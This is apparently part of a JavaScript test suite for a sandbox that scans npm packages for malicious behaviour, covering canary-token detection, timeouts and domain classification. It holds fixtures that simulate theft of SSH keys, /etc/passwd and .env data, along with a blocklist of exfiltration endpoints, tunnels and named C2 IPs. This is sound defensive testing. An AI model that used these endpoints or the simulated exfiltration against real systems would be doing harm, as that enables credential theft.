    const finalScore = Math.min(100, mockFindings.reduce((s, f) => {
      if (f.type === 'canary_exfiltration') return s + 50;
      return s;
    }, baseScore));
    assert(finalScore === 70, 'Final score should be base(20) + canary(50) = 70, got ' + finalScore);
  });

  // ============================================
  // SANDBOX LOCAL MODE TESTS
  // ============================================

  console.log('\n=== SANDBOX LOCAL MODE TESTS ===\n');

  await asyncTest('SANDBOX-LOCAL: runSandbox rejects non-existent local path', async () => {
    const { runSandbox } = require('../../src/sandbox/index.js');
    const origLog = console.log;
    const logs = [];
    console.log = (msg) => logs.push(msg);
    try {
      const result = await runSandbox('/nonexistent/path/that/does/not/exist', { local: true });
      assert(result.score === 0, 'Non-existent local path should return score 0, got ' + result.score);
      assert(result.severity === 'CLEAN', 'Should be CLEAN, got ' + result.severity);
      assert(logs.some(l => l.includes('Local path does not exist')), 'Should log path not found message');
    } finally {
      console.log = origLog;
    }
  });

  await asyncTest('SANDBOX-LOCAL: runSandbox rejects path-like input without --local flag', async () => {
    const { runSandbox } = require('../../src/sandbox/index.js');
    const origLog = console.log;
    const logs = [];
    console.log = (msg) => logs.push(msg);
    try {
      const result = await runSandbox('/tmp/some-local-dir', {});
      assert(result.score === 0, 'Path without --local should return score 0, got ' + result.score);
      assert(result.severity === 'CLEAN', 'Should be CLEAN');
      assert(logs.some(l => l.includes('Invalid package name')), 'Should log invalid package name');
    } finally {
      console.log = origLog;
    }
  });

  test('SANDBOX-LOCAL: displayName extraction from package.json', () => {
    const os = require('os');
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-local-test-'));
    try {
      fs.writeFileSync(path.join(tmpDir, 'package.json'), JSON.stringify({ name: 'my-local-pkg', version: '1.0.0' }));
      // Verify the path exists and package.json is readable
      const pkgJsonPath = path.join(tmpDir, 'package.json');
      assert(fs.existsSync(pkgJsonPath), 'package.json should exist');
      const pkg = JSON.parse(fs.readFileSync(pkgJsonPath, 'utf8'));
      assert(pkg.name === 'my-local-pkg', 'Should read package name from package.json');

      // Verify fallback to basename when no package.json name
      const tmpDir2 = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-local-test2-'));
      fs.writeFileSync(path.join(tmpDir2, 'package.json'), JSON.stringify({ version: '1.0.0' }));
      const pkg2 = JSON.parse(fs.readFileSync(path.join(tmpDir2, 'package.json'), 'utf8'));
      const fallbackName = pkg2.name || path.basename(tmpDir2);
      assert(fallbackName === path.basename(tmpDir2), 'Should fall back to directory basename when name is missing');
      fs.rmSync(tmpDir2, { recursive: true, force: true });
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // ============================================
  // SANDBOX ENTRY POINT EXECUTION TESTS
  // ============================================

  console.log('\n=== SANDBOX ENTRY POINT EXECUTION TESTS ===\n');

  test('SANDBOX-ENTRYPOINT: detectStaticCanaryExfiltration finds token in entrypoint_output', () => {
    const report = { entrypoint_output: 'sending ' + STATIC_CANARY_TOKENS.GITHUB_TOKEN };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 1, 'Should detect entrypoint output exfiltration');
    assert(result[0].token === 'GITHUB_TOKEN', 'Should identify GITHUB_TOKEN');
  });

  test('SANDBOX-ENTRYPOINT: detectStaticCanaryExfiltration clean entrypoint_output', () => {
    const report = {
      entrypoint_output: 'Module loaded successfully',
      install_output: 'npm install completed'
    };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length === 0, 'Clean entrypoint should return empty');
  });

  test('SANDBOX-ENTRYPOINT: scoreFindings works with report including entrypoint_output', () => {
    const report = {
      entrypoint_output: 'some runtime output',
      network: { dns_queries: ['evil.com'] }
    };
    const { score, findings } = scoreFindings(report);
    assert(score > 0, 'Should still score network findings');
    const dnsFindings = findings.filter(f => f.type === 'sandbox_network_outlier');
    assert(dnsFindings.length === 1, 'Should detect DNS network outlier finding');
  });

  test('SANDBOX-ENTRYPOINT: detectStaticCanaryExfiltration finds multiple tokens in entrypoint_output', () => {
    const report = {
      entrypoint_output: 'leaked: ' + STATIC_CANARY_TOKENS.NPM_TOKEN + ' and ' + STATIC_CANARY_TOKENS.AWS_ACCESS_KEY_ID
    };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length >= 2, 'Should detect 2+ tokens, got ' + result.length);
    const tokenNames = result.map(r => r.token);
    assert(tokenNames.includes('NPM_TOKEN'), 'Should include NPM_TOKEN');
    assert(tokenNames.includes('AWS_ACCESS_KEY_ID'), 'Should include AWS_ACCESS_KEY_ID');
  });

  // ============================================
  // SANDBOX ADDITIONAL COVERAGE TESTS
  // ============================================

  console.log('\n=== SANDBOX ADDITIONAL COVERAGE TESTS ===\n');

  test('SANDBOX-COV: scoreFindings with combined network and filesystem threats', () => {
    const report = {
      network: {
        dns_queries: ['evil.com'],
        http_connections: [{ host: '1.2.3.4', port: 8080 }]
      },
      filesystem: { created: ['/tmp/payload.bin'] },
      processes: { spawned: [{ command: '/opt/unknown-binary' }] }
    };
    const { score, findings } = scoreFindings(report);
    assert(score > 0, 'Combined report should have non-zero score');
    assert(findings.length >= 3, 'Should have findings from DNS, filesystem, and process');
    const types = findings.map(f => f.type);
    assert(types.includes('sandbox_network_outlier'), 'Should have network outlier DNS finding');
    assert(types.includes('suspicious_filesystem'), 'Should have filesystem finding');
    assert(types.includes('unknown_process'), 'Should have process finding');
  });

  test('SANDBOX-COV: scoreFindings with SSH key exfiltration pattern', () => {
    const report = { network: { http_bodies: ['ssh-rsa AAAAB3... user@host'] } };
    const { findings } = scoreFindings(report);
    const exfilFindings = findings.filter(f => f.type === 'data_exfiltration');
    assert(exfilFindings.length >= 1, 'Should detect SSH key exfiltration');
    assert(exfilFindings[0].detail.includes('SSH key'), 'Should identify as SSH key');
  });

  test('SANDBOX-COV: scoreFindings with private key exfiltration pattern', () => {
    const report = { network: { http_bodies: ['BEGIN RSA PRIVATE KEY-----\nMIIE...'] } };
    const { findings } = scoreFindings(report);
    const exfilFindings = findings.filter(f => f.type === 'data_exfiltration');
    assert(exfilFindings.length >= 1, 'Should detect private key exfiltration');
    assert(exfilFindings[0].detail.includes('private key'), 'Should identify as private key');
  });

  test('SANDBOX-COV: scoreFindings with /etc/passwd exfiltration pattern', () => {
    const report = { network: { http_bodies: ['root:x:0:0:root:/root:/bin/bash from /etc/passwd'] } };
    const { findings } = scoreFindings(report);
    const exfilFindings = findings.filter(f => f.type === 'data_exfiltration');
    assert(exfilFindings.length >= 1, 'Should detect passwd file exfiltration');
    assert(exfilFindings[0].severity === 'HIGH', 'Passwd exfil should be HIGH');
  });

  test('SANDBOX-COV: scoreFindings with .env exfiltration pattern', () => {
    const report = { network: { http_bodies: ['DB_HOST=localhost from .env file'] } };
    const { findings } = scoreFindings(report);
    const exfilFindings = findings.filter(f => f.type === 'data_exfiltration');
    assert(exfilFindings.length >= 1, 'Should detect .env exfiltration');
    assert(exfilFindings[0].severity === 'HIGH', '.env exfil should be HIGH');
  });

  test('SANDBOX-COV: scoreFindings with password exfiltration pattern', () => {
    const report = { network: { http_bodies: ['stolen password: abc123'] } };
    const { findings } = scoreFindings(report);
    const exfilFindings = findings.filter(f => f.type === 'data_exfiltration');
    assert(exfilFindings.length >= 1, 'Should detect password exfiltration');
  });

  test('SANDBOX-COV: scoreFindings with safe domain in HTTP connections', () => {
    const report = { network: { http_connections: [
      { host: 'registry.npmjs.org', port: 443 }
    ] } };
    const { score } = scoreFindings(report);
    assert(score === 0, 'Safe domain HTTP connection should score 0');
  });

  test('SANDBOX-COV: scoreFindings with subdomain of safe domain', () => {
    const report = { network: { dns_queries: ['sub.registry.npmjs.org'] } };
    const { score } = scoreFindings(report);
    assert(score === 0, 'Subdomain of safe domain should score 0');
  });

  test('SANDBOX-COV: scoreFindings with empty process command', () => {
    const report = { processes: { spawned: [{ command: '' }] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 0, 'Empty command should score 0, got ' + score);
    assert(findings.length === 0, 'Empty command should produce no findings');
  });

  test('SANDBOX-COV: detectStaticCanaryExfiltration with partial report fields', () => {
    // Report with some network fields missing
    const report = {
      network: {
        http_bodies: [],
        // dns_queries, http_requests, tls_connections intentionally omitted
      },
      // filesystem, processes intentionally omitted
    };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length === 0, 'Should handle missing network sub-fields gracefully');
  });

  test('SANDBOX-COV: detectStaticCanaryExfiltration with all search fields populated but clean', () => {
    const report = {
      network: {
        http_bodies: ['safe data only'],
        dns_queries: ['google.com', 'npmjs.org'],
        http_requests: [{ method: 'GET', host: 'npmjs.org', path: '/package' }],
        tls_connections: [{ domain: 'google.com', ip: '8.8.8.8', port: 443 }]
      },
      filesystem: { created: ['/tmp/safe-file.txt'] },
      processes: { spawned: [{ command: 'node index.js' }] },
      install_output: 'npm install completed successfully'
    };
    const result = detectStaticCanaryExfiltration(report);
    assert(result.length === 0, 'Clean report with all fields should return empty');
  });

  await asyncTest('SANDBOX-COV: runSandbox returns clean result when Docker unavailable', async () => {
    const { runSandbox } = require('../../src/sandbox/index.js');
    const { execSync: origExecSync } = require('child_process');
    const origLog = console.log;
    console.log = () => {};
    try {
      // runSandbox checks isDockerAvailable internally via execSync('docker info')
      // On machines without Docker, this naturally returns clean result
      const result = await runSandbox('lodash', {});
      assert(typeof result === 'object', 'Should return an object');
      assert(typeof result.score === 'number', 'Should have a numeric score');
      assert(typeof result.severity === 'string', 'Should have a severity string');
      assert(Array.isArray(result.findings), 'Should have findings array');
    } finally {
      console.log = origLog;
    }
  });

  // ============================================
  // SANDBOX TIMEOUT ORDERING TESTS (FIX: timedOut before Docker error)
  // ============================================

  console.log('\n=== SANDBOX TIMEOUT ORDERING TESTS ===\n');

  test('SANDBOX-TIMEOUT: proc.on(close) checks timedOut BEFORE Docker error handler', () => {
    // Regression test: the timedOut check must come before the Docker error handler
    // in proc.on('close'). If reversed, docker kill (exit 137) triggers Docker error
    // handler which returns CLEAN instead of INCONCLUSIVE timeout result.
    const source = fs.readFileSync(path.join(__dirname, '../../src/sandbox/index.js'), 'utf8');
    const timedOutIdx = source.indexOf('if (timedOut)');
    const dockerErrorIdx = source.indexOf('// Docker-level failure (non-timeout)');
    assert(timedOutIdx > 0, 'Should find timedOut check in source');
    assert(dockerErrorIdx > 0, 'Should find Docker error handler in source');
    assert(timedOutIdx < dockerErrorIdx,
      `timedOut check (pos ${timedOutIdx}) must come BEFORE Docker error handler (pos ${dockerErrorIdx}) — ` +
      'otherwise docker kill exit code 137 returns CLEAN instead of INCONCLUSIVE');
  });

  test('SANDBOX-TIMEOUT: timeout result has score -1 and INCONCLUSIVE severity', () => {
    // Verify the expected shape of timeout results
    // This mirrors the timeout result constructed in proc.on('close')
    // Timeout = INCONCLUSIVE: cannot determine if package is malicious or just slow
    const timeoutResult = {
      score: -1,
      severity: 'INCONCLUSIVE',
      findings: [{
        type: 'timeout',
        severity: 'MEDIUM',
        detail: 'Container exceeded 120s timeout — package too large or slow install',
        evidence: 'Killed after 120000ms'
      }],
      raw_report: null,
      suspicious: false,
      inconclusive: true
    };
    assert(timeoutResult.score === -1, 'Timeout result must have score -1 (INCONCLUSIVE)');
    assert(timeoutResult.severity === 'INCONCLUSIVE', 'Timeout result must be INCONCLUSIVE');
    assert(timeoutResult.findings[0].type === 'timeout', 'Timeout finding type must be timeout');
    assert(timeoutResult.suspicious === false, 'Timeout result must NOT be suspicious');
    assert(timeoutResult.inconclusive === true, 'Timeout result must have inconclusive flag');
  });

  test('SANDBOX-TIMEOUT: clean result has score 0 (Docker error, NOT timeout)', () => {
    // The clean result should only be returned for non-timeout Docker failures
    // (e.g. OOM, image pull error) — never for timeout kills
    const cleanResult = { score: 0, severity: 'CLEAN', findings: [], raw_report: null, suspicious: false };
    assert(cleanResult.score === 0, 'Clean result must have score 0');
    assert(cleanResult.severity === 'CLEAN', 'Clean result must be CLEAN');
    assert(cleanResult.suspicious === false, 'Clean result must not be suspicious');
  });

  test('SANDBOX-COV: generateNetworkReport with ssh-ed25519 exfil pattern', () => {
    const report = {
      package: 'test-pkg',
      timestamp: '2025-01-01T00:00:00Z',
      mode: 'permissive',
      duration_ms: 3000,
      network: {
        dns_resolutions: [],
        http_requests: [],
        tls_connections: [],
        http_connections: [],
        blocked_connections: [],
        http_bodies: ['ssh-ed25519 AAAAC3Nz... user@host']
      }
    };
    const output = generateNetworkReport(report);
    assert(output.includes('Data Exfiltration'), 'Should have exfil section');
    assert(output.includes('SSH key'), 'Should identify SSH key in report');
  });

  // ============================================
  // LIBFAKETIME INTEGRATION TESTS (v2.10.7)
  // ============================================

  console.log('\n=== LIBFAKETIME INTEGRATION TESTS ===\n');

  test('SANDBOX-FAKETIME: TIME_OFFSETS[0] has offset=0 (no libfaketime for run 1)', () => {
    assert(TIME_OFFSETS[0].offset === 0, 'First run should have offset 0');
  });

  test('SANDBOX-FAKETIME: TIME_OFFSETS[1] has offset=259200000 (72h)', () => {
    assert(TIME_OFFSETS[1].offset === 259200000, 'Second run should have 72h offset');
  });

  test('SANDBOX-FAKETIME: TIME_OFFSETS[2] has offset=604800000 (7d)', () => {
    assert(TIME_OFFSETS[2].offset === 604800000, 'Third run should have 7d offset');
  });

  test('SANDBOX-FAKETIME: FAKETIME string format for 72h → "+3d x1000"', () => {
    const timeOffset = 259200000; // 72h
    const hours = Math.floor(timeOffset / 3600000);
    const faketimeStr = hours >= 24
      ? `+${Math.floor(hours / 24)}d x1000`
      : `+${hours}h x1000`;
    assert(faketimeStr === '+3d x1000', `Expected "+3d x1000", got "${faketimeStr}"`);
  });

  test('SANDBOX-FAKETIME: FAKETIME string format for 7d → "+7d x1000"', () => {
    const timeOffset = 604800000; // 7d
    const hours = Math.floor(timeOffset / 3600000);
    const faketimeStr = hours >= 24
      ? `+${Math.floor(hours / 24)}d x1000`
      : `+${hours}h x1000`;
    assert(faketimeStr === '+7d x1000', `Expected "+7d x1000", got "${faketimeStr}"`);
  });

  test('SANDBOX-FAKETIME: FAKETIME string format for 12h → "+12h x1000"', () => {
    const timeOffset = 43200000; // 12h
    const hours = Math.floor(timeOffset / 3600000);
    const faketimeStr = hours >= 24
      ? `+${Math.floor(hours / 24)}d x1000`
      : `+${hours}h x1000`;
    assert(faketimeStr === '+12h x1000', `Expected "+12h x1000", got "${faketimeStr}"`);
  });

  test('SANDBOX-FAKETIME: offset=0 → useFaketime=false, NODE_TIMING_OFFSET=0', () => {
    const timeOffset = 0;
    const useFaketime = timeOffset > 0;
    assert(useFaketime === false, 'offset=0 should not use faketime');
    const nodeTimingOffset = useFaketime ? 0 : timeOffset;
    assert(nodeTimingOffset === 0, 'NODE_TIMING_OFFSET should be 0');
  });

  test('SANDBOX-FAKETIME: offset>0 → useFaketime=true, NODE_TIMING_OFFSET=0 (anti double-accel)', () => {
    const timeOffset = 259200000;
    const useFaketime = timeOffset > 0;
    assert(useFaketime === true, 'offset>0 should use faketime');
    const nodeTimingOffset = useFaketime ? 0 : timeOffset;
    assert(nodeTimingOffset === 0, 'NODE_TIMING_OFFSET must be 0 when faketime active (prevents double acceleration)');
  });

  // ============================================
  // NETWORK ALLOWLIST + OUTLIER DETECTION TESTS
  // ============================================

  console.log('\n=== SANDBOX NETWORK ALLOWLIST TESTS ===\n');

  const {
    classifyDomain,
    SAFE_INSTALL_DOMAINS,
    KNOWN_EXFIL_DOMAINS,
    KNOWN_EXFIL_PATTERNS,
    TUNNEL_DOMAINS,
    getCustomAllowlist
  } = require('../../src/sandbox/network-allowlist.js');

  // -- classifyDomain unit tests --

  test('SANDBOX-ALLOWLIST: registry.npmjs.org → safe', () => {
    assert(classifyDomain('registry.npmjs.org') === 'safe', 'npm registry should be safe');
  });

  test('SANDBOX-ALLOWLIST: github.com → safe', () => {
    assert(classifyDomain('github.com') === 'safe', 'github.com should be safe');
  });

  test('SANDBOX-ALLOWLIST: api.github.com → safe (subdomain match)', () => {
    assert(classifyDomain('api.github.com') === 'safe', 'api.github.com should be safe');
  });

  test('SANDBOX-ALLOWLIST: foo.amazonaws.com → safe (S3 binaries)', () => {
    assert(classifyDomain('foo.amazonaws.com') === 'safe', 'S3 subdomain should be safe');
  });

  test('SANDBOX-ALLOWLIST: nodejs.org → safe', () => {
    assert(classifyDomain('nodejs.org') === 'safe', 'nodejs.org should be safe');
  });

  test('SANDBOX-ALLOWLIST: cdn.jsdelivr.net → safe', () => {
    assert(classifyDomain('cdn.jsdelivr.net') === 'safe', 'jsdelivr should be safe');
  });

  test('SANDBOX-ALLOWLIST: unpkg.com → safe', () => {
    assert(classifyDomain('unpkg.com') === 'safe', 'unpkg should be safe');
  });

  test('SANDBOX-ALLOWLIST: registry.yarnpkg.com → safe', () => {
    assert(classifyDomain('registry.yarnpkg.com') === 'safe', 'yarn registry should be safe');
  });

  test('SANDBOX-ALLOWLIST: webhook.site → blacklisted', () => {
    assert(classifyDomain('webhook.site') === 'blacklisted', 'webhook.site should be blacklisted');
  });

  test('SANDBOX-ALLOWLIST: oastify.com → blacklisted', () => {
    assert(classifyDomain('oastify.com') === 'blacklisted', 'oastify.com should be blacklisted');
  });

  test('SANDBOX-ALLOWLIST: abc123.oast.online → blacklisted (regex pattern)', () => {
    assert(classifyDomain('abc123.oast.online') === 'blacklisted', 'OAST subdomain should be blacklisted');
  });

  test('SANDBOX-ALLOWLIST: x.burpcollaborator.net → blacklisted (regex)', () => {
    assert(classifyDomain('x.burpcollaborator.net') === 'blacklisted', 'Burp collaborator should be blacklisted');
  });

  test('SANDBOX-ALLOWLIST: recv.hackmoltrepeat.com → blacklisted (campaign C2)', () => {
    assert(classifyDomain('recv.hackmoltrepeat.com') === 'blacklisted', 'Campaign C2 should be blacklisted');
  });

  test('SANDBOX-ALLOWLIST: api.telegram.org → blacklisted (exfil)', () => {
    assert(classifyDomain('api.telegram.org') === 'blacklisted', 'Telegram bot API should be blacklisted');
  });

  test('SANDBOX-ALLOWLIST: 45.148.10.212 → blacklisted (TeamPCP C2 IP)', () => {
    assert(classifyDomain('45.148.10.212') === 'blacklisted', 'TeamPCP IP should be blacklisted');
  });

  test('SANDBOX-ALLOWLIST: ngrok.io → tunnel', () => {
    assert(classifyDomain('ngrok.io') === 'tunnel', 'ngrok should be tunnel');
  });

  test('SANDBOX-ALLOWLIST: abc.ngrok-free.app → tunnel (subdomain)', () => {
    assert(classifyDomain('abc.ngrok-free.app') === 'tunnel', 'ngrok-free subdomain should be tunnel');
  });

  test('SANDBOX-ALLOWLIST: trycloudflare.com → tunnel', () => {
    assert(classifyDomain('trycloudflare.com') === 'tunnel', 'Cloudflare tunnel should be tunnel');
  });

  test('SANDBOX-ALLOWLIST: random-domain.com → unknown', () => {
    assert(classifyDomain('random-domain.com') === 'unknown', 'Unknown domain should be unknown');
  });

  test('SANDBOX-ALLOWLIST: 1.2.3.4 → unknown (non-blacklisted IP)', () => {
    assert(classifyDomain('1.2.3.4') === 'unknown', 'Unknown IP should be unknown');
  });

  test('SANDBOX-ALLOWLIST: empty/null inputs → unknown', () => {
    assert(classifyDomain('') === 'unknown', 'Empty string should be unknown');
    assert(classifyDomain(null) === 'unknown', 'null should be unknown');
    assert(classifyDomain(undefined) === 'unknown', 'undefined should be unknown');
  });

  test('SANDBOX-ALLOWLIST: case insensitive matching', () => {
    assert(classifyDomain('REGISTRY.NPMJS.ORG') === 'safe', 'Upper case safe domain should match');
    assert(classifyDomain('Webhook.Site') === 'blacklisted', 'Mixed case blacklisted should match');
    assert(classifyDomain('ABC.OAST.ONLINE') === 'blacklisted', 'Upper case OAST pattern should match');
  });

  // -- env var extension --

  test('SANDBOX-ALLOWLIST: MUADDIB_SANDBOX_NETWORK_ALLOWLIST env var extends safe list', () => {
    const orig = process.env.MUADDIB_SANDBOX_NETWORK_ALLOWLIST;
    try {
      process.env.MUADDIB_SANDBOX_NETWORK_ALLOWLIST = 'custom-cdn.example.com, my-registry.corp.net';
      assert(classifyDomain('custom-cdn.example.com') === 'safe', 'Custom allowlisted domain should be safe');
      assert(classifyDomain('my-registry.corp.net') === 'safe', 'Custom allowlisted domain should be safe');
      assert(classifyDomain('evil.com') === 'unknown', 'Non-allowlisted domain should still be unknown');
    } finally {
      if (orig === undefined) delete process.env.MUADDIB_SANDBOX_NETWORK_ALLOWLIST;
      else process.env.MUADDIB_SANDBOX_NETWORK_ALLOWLIST = orig;
    }
  });

  // -- scoreFindings integration with classifyDomain --

  test('SANDBOX-NET-ALLOWLIST: blacklisted DNS → sandbox_known_exfil_domain CRITICAL', () => {
    const report = { network: { dns_queries: ['webhook.site'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 50, 'Blacklisted DNS should score 50, got ' + score);
    const exfilFindings = findings.filter(f => f.type === 'sandbox_known_exfil_domain');
    assert(exfilFindings.length === 1, 'Should have 1 sandbox_known_exfil_domain finding');
    assert(exfilFindings[0].severity === 'CRITICAL', 'Should be CRITICAL severity');
    assert(exfilFindings[0].evidence === 'webhook.site', 'Evidence should be the domain');
  });

  test('SANDBOX-NET-ALLOWLIST: OAST pattern DNS → sandbox_known_exfil_domain CRITICAL', () => {
    const report = { network: { dns_queries: ['abc.oast.live'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 50, 'OAST pattern DNS should score 50, got ' + score);
    const exfilFindings = findings.filter(f => f.type === 'sandbox_known_exfil_domain');
    assert(exfilFindings.length === 1, 'Should have 1 sandbox_known_exfil_domain finding');
    assert(exfilFindings[0].severity === 'CRITICAL', 'Should be CRITICAL');
  });

  test('SANDBOX-NET-ALLOWLIST: unknown DNS → sandbox_network_outlier HIGH', () => {
    const report = { network: { dns_queries: ['suspicious-cdn.example.com'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 20, 'Unknown DNS should score 20, got ' + score);
    const outlierFindings = findings.filter(f => f.type === 'sandbox_network_outlier');
    assert(outlierFindings.length === 1, 'Should have 1 sandbox_network_outlier finding');
    assert(outlierFindings[0].severity === 'HIGH', 'Should be HIGH severity');
  });

  test('SANDBOX-NET-ALLOWLIST: tunnel DNS → sandbox_network_outlier HIGH (score 30)', () => {
    const report = { network: { dns_queries: ['abc.ngrok.io'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 30, 'Tunnel DNS should score 30, got ' + score);
    const outlierFindings = findings.filter(f => f.type === 'sandbox_network_outlier');
    assert(outlierFindings.length === 1, 'Should have 1 sandbox_network_outlier finding');
    assertIncludes(outlierFindings[0].detail, 'tunnel', 'Detail should mention tunnel');
  });

  test('SANDBOX-NET-ALLOWLIST: safe DNS → no finding', () => {
    const report = { network: { dns_queries: ['registry.npmjs.org', 'github.com', 'foo.amazonaws.com'] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 0, 'All safe domains should score 0, got ' + score);
    assert(findings.length === 0, 'Should have 0 findings');
  });

  test('SANDBOX-NET-ALLOWLIST: blacklisted TCP → sandbox_known_exfil_domain CRITICAL', () => {
    const report = { network: { http_connections: [
      { host: '45.148.10.212', port: 443 }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 50, 'Blacklisted TCP should score 50, got ' + score);
    const exfilFindings = findings.filter(f => f.type === 'sandbox_known_exfil_domain');
    assert(exfilFindings.length === 1, 'Should have 1 exfil finding');
    assert(exfilFindings[0].severity === 'CRITICAL', 'Should be CRITICAL');
  });

  test('SANDBOX-NET-ALLOWLIST: blacklisted TLS → sandbox_known_exfil_domain CRITICAL', () => {
    const report = { network: { tls_connections: [
      { domain: 'oastify.com', ip: '1.2.3.4', port: 443 }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 50, 'Blacklisted TLS should score 50, got ' + score);
    const exfilFindings = findings.filter(f => f.type === 'sandbox_known_exfil_domain');
    assert(exfilFindings.length === 1, 'Should have 1 exfil finding');
  });

  test('SANDBOX-NET-ALLOWLIST: blacklisted HTTP request → sandbox_known_exfil_domain CRITICAL', () => {
    const report = { network: { http_requests: [
      { method: 'POST', host: 'webhook.site', path: '/abc' }
    ] } };
    const { score, findings } = scoreFindings(report);
    assert(score === 50, 'Blacklisted HTTP should score 50, got ' + score);
    const exfilFindings = findings.filter(f => f.type === 'sandbox_known_exfil_domain');
    assert(exfilFindings.length === 1, 'Should have 1 exfil finding');
    assert(exfilFindings[0].severity === 'CRITICAL', 'Should be CRITICAL');
  });

  test('SANDBOX-NET-ALLOWLIST: mixed blacklisted + safe + unknown in single report', () => {
    const report = { network: {
      dns_queries: ['webhook.site', 'registry.npmjs.org', 'random-cdn.com'],
      http_connections: [{ host: 'github.com', port: 443 }]
    } };
    const { score, findings } = scoreFindings(report);
    // webhook.site → 50, random-cdn.com → 20 = 70
    assert(score === 70, 'Mixed report should score 70, got ' + score);
    const exfil = findings.filter(f => f.type === 'sandbox_known_exfil_domain');
    const outlier = findings.filter(f => f.type === 'sandbox_network_outlier');
    assert(exfil.length === 1, 'Should have 1 exfil finding (webhook.site)');
    assert(outlier.length === 1, 'Should have 1 outlier finding (random-cdn.com)');
  });

  test('SANDBOX-NET-ALLOWLIST: GlassWorm C2 IP in DNS → blacklisted', () => {
    const report = { network: { dns_queries: ['217.69.3.218'] } };
    const { findings } = scoreFindings(report);
    const exfil = findings.filter(f => f.type === 'sandbox_known_exfil_domain');
    assert(exfil.length === 1, 'GlassWorm C2 IP should trigger exfil finding');
  });

  test('SANDBOX-NET-ALLOWLIST: multiple blacklisted domains score caps at 100', () => {
    const report = { network: { dns_queries: [
      'webhook.site', 'oastify.com', 'burpcollaborator.net'
    ] } };
    const { score } = scoreFindings(report);
    // 50 + 50 + 50 = 150 → capped at 100
    assert(score === 100, 'Score should cap at 100, got ' + score);
  });
}

module.exports = { runSandboxTests };
